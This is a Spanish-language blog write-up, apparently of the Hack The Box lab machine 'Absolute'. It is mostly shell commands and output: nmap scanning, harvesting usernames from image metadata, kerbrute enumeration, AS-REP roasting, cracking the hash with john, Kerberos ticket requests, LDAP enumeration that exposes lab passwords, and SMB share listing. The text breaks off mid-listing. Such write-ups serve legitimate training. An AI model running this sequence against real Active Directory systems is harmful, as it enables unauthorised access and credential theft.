@@ -1,0 +1,695 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Absolute" /><meta property="og:locale" content="en" /><meta name="description" content="```shell Nmap 7.92 scan initiated Thu Feb 23 21:11:13 2023 as: nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49673,49674,49675,49685,49687,49698,49702 -oN targeted 10.10.11.181 Nmap scan report for 10.10.11.181 Host is up (0.10s latency)." /><meta property="og:description" content="```shell Nmap 7.92 scan initiated Thu Feb 23 21:11:13 2023 as: nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49673,49674,49675,49685,49687,49698,49702 -oN targeted 10.10.11.181 Nmap scan report for 10.10.11.181 Host is up (0.10s latency)." /><link rel="canonical" href="https://arvillalobos.github.io/posts/ABSOLUTE/" /><meta property="og:url" content="https://arvillalobos.github.io/posts/ABSOLUTE/" /><meta property="og:site_name" content="ArVillalobos" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-02-23T13:25:30-06:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Absolute" /><meta name="twitter:site" content="@ArVillalobos" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-02-23T13:25:30-06:00","datePublished":"2023-02-23T13:25:30-06:00","description":"```shell Nmap 7.92 scan initiated Thu Feb 23 21:11:13 2023 as: nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49673,49674,49675,49685,49687,49698,49702 -oN targeted 10.10.11.181 Nmap scan report for 10.10.11.181 Host is up (0.10s latency).","headline":"Absolute","mainEntityOfPage":{"@type":"WebPage","@id":"https://arvillalobos.github.io/posts/ABSOLUTE/"},"url":"https://arvillalobos.github.io/posts/ABSOLUTE/"}</script><title>Absolute | ArVillalobos</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="ArVillalobos"><meta name="application-name" content="ArVillalobos"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/images/Cyber.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">ArVillalobos</a></div><div class="site-subtitle font-italic">Ethical Hacker</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/ArVillalobos" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ArVillalobos" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['armando.villalobos','outlook.es'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Absolute</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Absolute</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1677180330" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Feb 23, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/ArVillalobos">ArVillalobos</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2581 words"> <em>14 min</em> read</span></div></div></div><div class="post-content"><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.92 scan initiated Thu Feb 23 21:11:13 2023 as: nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49673,49674,49675,49685,49687,49698,49702 -oN targeted 10.10.11.181</span>
+Nmap scan report <span class="k">for </span>10.10.11.181
+Host is up <span class="o">(</span>0.10s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Absolute
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-02-24 10:11:27Z<span class="o">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: absolute.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2023-02-24T10:12:33+00:00<span class="p">;</span> +7h00m00s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.absolute.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.absolute.htb
+| Not valid before: 2022-06-09T08:14:24
+|_Not valid after:  2023-06-09T08:14:24
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: absolute.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2023-02-24T10:12:34+00:00<span class="p">;</span> +7h00m00s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.absolute.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.absolute.htb
+| Not valid before: 2022-06-09T08:14:24
+|_Not valid after:  2023-06-09T08:14:24
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: absolute.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.absolute.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.absolute.htb
+| Not valid before: 2022-06-09T08:14:24
+|_Not valid after:  2023-06-09T08:14:24
+|_ssl-date: 2023-02-24T10:12:33+00:00<span class="p">;</span> +7h00m00s from scanner time.
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: absolute.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.absolute.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.absolute.htb
+| Not valid before: 2022-06-09T08:14:24
+|_Not valid after:  2023-06-09T08:14:24
+|_ssl-date: 2023-02-24T10:12:34+00:00<span class="p">;</span> +7h00m00s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc         Microsoft Windows RPC
+49685/tcp open  msrpc         Microsoft Windows RPC
+49687/tcp open  msrpc         Microsoft Windows RPC
+49698/tcp open  msrpc         Microsoft Windows RPC
+49702/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
+| smb2-time: 
+|   <span class="nb">date</span>: 2023-02-24T10:12:25
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Thu Feb 23 21:12:34 2023 -- 1 IP address (1 host up) scanned in 81.25 seconds</span>
+</pre></table></code></div></div><p>Dentro de la página web encontramos al parecer una página estática sin ninguna ruta a la que acceder.</p><p><img data-src="/assets/images/Absolute/absolute1.png" alt="imagen1" data-proofer-ignore></p><p>Al ver el código fuente encontramos las imágenes que se están mostrando, procedemos a descargarlos y verficamos si podemos sacar alguna información importante de estas. Descargamos una de las imágenes y la inspeccionamos con exiftools, al parecer encontramos el nombre del autor en ella, procedemos a descargar las demás imágenes para verificar si existen más autores.</p><p><img data-src="/assets/images/Absolute/absolute2.png" alt="imagen2" data-proofer-ignore></p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre>❯ exiftool index.jpeg
+ExifTool Version Number         : 12.16
+File Name                       : index.jpeg
+Directory                       : <span class="nb">.</span>
+File Size                       : 2.2 MiB
+File Modification Date/Time     : 2023:02:23 21:19:51-06:00
+File Access Date/Time           : 2023:02:23 21:19:29-06:00
+File Inode Change Date/Time     : 2023:02:23 21:19:51-06:00
+File Permissions                : rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : inches
+X Resolution                    : 72
+Y Resolution                    : 72
+XMP Toolkit                     : Image::ExifTool 11.88
+Author                          : Nicole Smith
+Profile CMM Type                : Linotronic
+Profile Version                 : 2.1.0
+Profile Class                   : Display Device Profile
+&lt;SNIP&gt;
+</pre></table></code></div></div><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>❯ <span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 6<span class="si">)</span><span class="p">;</span> <span class="k">do </span>wget http://10.10.11.181/images/hero_<span class="nv">$i</span>.jpg<span class="p">;</span><span class="k">done</span>
+❯ <span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 6<span class="si">)</span><span class="p">;</span> <span class="k">do </span>exiftool hero_<span class="nv">$i</span>.jpg | <span class="nb">grep </span>Author<span class="p">;</span><span class="k">done
+</span>Author                          : James Roberts
+Author                          : Michael Chaffrey
+Author                          : Donald Klay
+Author                          : Sarah Osvald
+Author                          : Jeffer Robinson
+Author                          : Nicole Smith
+</pre></table></code></div></div><p>Obtenemos un listado de usuarios, al tener abierto el puerto 88 podemos validarlos por kerberos pero antes procedemos a darles formato a los nombres para identificar como está estructurado el nombre de usuarios. Para eso voy a usar la herramienta <a href="https://github.com/byt3bl33d3r/SprayingToolkit" title="Spindrift">!Link</a> para obtener el listado de usuarios.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre>❯ /usr/bin/cat userlist.txt
+jroberts
+mchaffrey
+dklay
+sosvald
+jrobinson
+nsmith
+jamesr
+michaelc
+donaldk
+saraho
+jefferr
+nicoles
+j.roberts
+m.chaffrey
+&lt;SNIP&gt;
+</pre></table></code></div></div><p>Usamos kerbrute para enumerar los usuarios y encontramos que un patrón es válido para todos ellos.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre>❯ kerbrute userenum <span class="nt">-d</span> absolute.htb <span class="nt">--dc</span> 10.10.11.181 userlist.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        
+
+Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 02/23/23 - Ronnie Flathers @ropnop
+
+2023/02/23 21:56:31 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
+2023/02/23 21:56:31 <span class="o">&gt;</span>  	10.10.11.181:88
+
+2023/02/23 21:56:32 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	j.robinson@absolute.htb
+2023/02/23 21:56:32 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	j.roberts@absolute.htb
+2023/02/23 21:56:32 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	s.osvald@absolute.htb
+2023/02/23 21:56:32 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	m.chaffrey@absolute.htb
+2023/02/23 21:56:32 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	n.smith@absolute.htb
+2023/02/23 21:56:32 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	d.klay@absolute.htb
+2023/02/23 21:56:37 <span class="o">&gt;</span>  Done! Tested 48 usernames <span class="o">(</span>6 valid<span class="o">)</span> <span class="k">in </span>6.082 seconds
+</pre></table></code></div></div><p>Podemos intentar aplicar un asreproast attack para ver si podemos obtener algún hash de algún usuario. Al ejecutarlo vemos que obtenemos el hash del usuario d.klay. Que procedemos a crackearlo.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>❯ GetNPUsers.py absolute.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> userlist.txt
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+<span class="o">[</span>-] User j.roberts doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User m.chaffrey doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="nv">$krb5asrep$23$d</span>.klay@ABSOLUTE.HTB:74d394343487190d5b4d87f754334b64<span class="nv">$&lt;</span>SNIP&gt;
+<span class="o">[</span>-] User s.osvald doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User j.robinson doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User n.smith doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+</span></pre></table></code></div></div><p>Logramos crackear el hash y obtenemos la contraseña del usuario, ahora debemos enumerar otros servicios usando esta contraseña.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>❯ john <span class="nt">-w</span><span class="o">=</span>/usr/share/Seclists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x]<span class="o">)</span>
+Will run 6 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+Darkmoonsky248girl <span class="o">(</span><span class="nv">$krb5asrep$23$d</span>.klay@ABSOLUTE.HTB<span class="o">)</span>
+1g 0:00:00:06 DONE <span class="o">(</span>2023-02-23 22:02<span class="o">)</span> 0.1543g/s 1734Kp/s 1734Kc/s 1734KC/s Darren@msn..Danish1984
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</pre></table></code></div></div><p>Al validarlo por crackmapexec vemos que tienen una restricción de cuenta.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>❯ crackmapexec smb 10.10.11.181 <span class="nt">-u</span> d.klay <span class="nt">-p</span> Darkmoonsky248girl
+SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.181    445    DC               <span class="o">[</span>-] absolute.htb<span class="se">\d</span>.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
+</pre></table></code></div></div><p>Al parecer no podemos autenticarnos por smb pero por ldap tal vez si podeamos, pero para esto creamos un ticket del usuario para poder lograrlo.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre><td class="rouge-code"><pre>❯ python3 getTGT.py absolute.htb/d.klay:Darkmoonsky248girl
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>d.klay.ccache
+
+❯ crackmapexec ldap absolute.htb <span class="nt">-u</span> d.klay <span class="nt">-d</span> absolute.htb <span class="nt">-k</span> <span class="nt">--kdcHost</span> dc.absolute.htb <span class="nt">--users</span>
+SMB         absolute.htb    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+LDAP        absolute.htb    389    DC               <span class="o">[</span>+] absolute.htb<span class="se">\</span>
+LDAP        absolute.htb    389    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Total of records returned 20
+LDAP        absolute.htb    389    DC               Administrator                  Built-in account <span class="k">for </span>administering the computer/domain
+LDAP        absolute.htb    389    DC               Guest                          Built-in account <span class="k">for </span>guest access to the computer/domain
+LDAP        absolute.htb    389    DC               krbtgt                         Key Distribution Center Service Account
+LDAP        absolute.htb    389    DC               J.Roberts                      
+LDAP        absolute.htb    389    DC               M.Chaffrey                     
+LDAP        absolute.htb    389    DC               D.Klay                         
+LDAP        absolute.htb    389    DC               s.osvald                       
+LDAP        absolute.htb    389    DC               j.robinson                     
+LDAP        absolute.htb    389    DC               n.smith                        
+LDAP        absolute.htb    389    DC               m.lovegod                      
+LDAP        absolute.htb    389    DC               l.moore                        
+LDAP        absolute.htb    389    DC               c.colt                         
+LDAP        absolute.htb    389    DC               s.johnson                      
+LDAP        absolute.htb    389    DC               d.lemm                         
+LDAP        absolute.htb    389    DC               svc_smb                        AbsoluteSMBService123!
+LDAP        absolute.htb    389    DC               svc_audit                      
+LDAP        absolute.htb    389    DC               winrm_user                     Used to perform simple network tasks
+</pre></table></code></div></div><p>Al enumerar los usuarios vemos que conseguimos las credenciales del usuario svc_smb. Podemos volver a enumerar los servicios para ver que información podemos obtener de este usuario.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>❯ crackmapexec smb 10.10.11.181 <span class="nt">-u</span> svc_smb <span class="nt">-p</span> AbsoluteSMBService123!
+SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.181    445    DC               <span class="o">[</span>-] absolute.htb<span class="se">\s</span>vc_smb:AbsoluteSMBService123! STATUS_ACCOUNT_RESTRICTION 
+</pre></table></code></div></div><p>Podemos ver la misma restricción como el usuario klay por lo que volvemos a repetir los pasos para generar el ticket.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre>❯ python3 /opt/impacket/examples/smbclient.py svc_smb@dc.absolute.htb <span class="nt">-k</span> <span class="nt">-no-pass</span>
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+Type <span class="nb">help </span><span class="k">for </span>list of commands
+<span class="c"># shares</span>
+ADMIN<span class="err">$</span>
+C<span class="err">$</span>
+IPC<span class="err">$</span>
+NETLOGON
+Shared
+SYSVOL
+<span class="c"># use Shared</span>
+<span class="c"># ls</span>
+drw-rw-rw-          0  Thu Sep  1 12:02:23 2022 <span class="nb">.</span>
